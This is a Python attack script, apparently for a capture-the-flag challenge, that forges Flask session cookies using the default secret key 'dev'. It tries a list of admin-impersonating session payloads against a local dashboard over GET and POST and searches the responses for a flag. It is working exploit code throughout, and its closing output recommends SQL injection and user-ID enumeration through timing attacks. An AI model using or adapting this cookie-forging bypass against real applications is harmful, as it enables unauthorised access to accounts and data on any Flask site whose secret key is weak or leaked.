import requests
import re
from itsdangerous import URLSafeTimedSerializer
import hashlib

# Target URL
base_url = "http://127.0.0.1:32883"
dashboard_url = f"{base_url}/dashboard"

# Working secret key
secret_key = 'dev'

def forge_flask_session(secret_key, session_data):
    """Forge a Flask session cookie"""
    try:
        serializer = URLSafeTimedSerializer(
            secret_key,
            salt='cookie-session',
            signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
        )
        forged_cookie = serializer.dumps(session_data)
        return forged_cookie
    except Exception as e:
        print(f"[!] Error forging session: {e}")
        return None

print("[*] Testing username-based and other session structures")
print("="*80)

# Try username-based sessions
session_variations = [
    # Username-based
    {'username': 'admin'},
    {'username': 'administrator'},
    {'username': 'root'},
    {'username': 'test'},
    
    # Combinations
    {'username': 'admin', 'user_type': 'admin'},
    {'username': 'admin', 'user_id': 1},
    
    # Try logged_in flag
    {'user_id': 1, 'logged_in': True},
    {'username': 'admin', 'logged_in': True},
    
    # Try authenticated flag
    {'user_id': 1, 'authenticated': True},
    {'username': 'admin', 'authenticated': True},
]

found_flag = False

# Test both GET and POST methods
for session_data in session_variations:
    if found_flag:
        break
        
    forged_cookie = forge_flask_session(secret_key, session_data)
    if not forged_cookie:
        continue
        
    cookies = {'session': forged_cookie}
    
    # Try GET
    response = requests.get(dashboard_url, cookies=cookies, allow_redirects=True, timeout=5)
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    
    if response.status_code == 200 and len(response.text) > 2000:
        print(f"\n[+] Session (GET): {session_data}")
        print(f"[+] Status: {response.status_code} | Length: {len(response.content)}B")
        
        if flag_match:
            print(f"[!] FLAG FOUND: {flag_match.group(0)}")
            print(f"[+] Full Response:\n{response.text}")
            found_flag = True
            break
        else:
            print(f"[+] Response preview:\n{response.text[:500]}")
    
    # Try POST
    response = requests.post(dashboard_url, cookies=cookies, allow_redirects=True, timeout=5)
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    
    if response.status_code == 200 and len(response.text) > 2000:
        print(f"\n[+] Session (POST): {session_data}")
        print(f"[+] Status: {response.status_code} | Length: {len(response.content)}B")
        
        if flag_match:
            print(f"[!] FLAG FOUND: {flag_match.group(0)}")
            print(f"[+] Full Response:\n{response.text}")
            found_flag = True
            break
        else:
            print(f"[+] Response preview:\n{response.text[:500]}")

if not found_flag:
    print("\n[-] No flag found with username-based sessions")
    print("\n[*] The application logic requires user_id to exist in database")
    print("[*] Need to find the actual admin user_id or use a different approach")
    print("\n[*] Recommendations:")
    print("    1. Use SQL injection to find admin user_id")
    print("    2. Enumerate user_ids through timing attack or error messages")
    print("    3. Check if there's an /api endpoint that reveals user info")

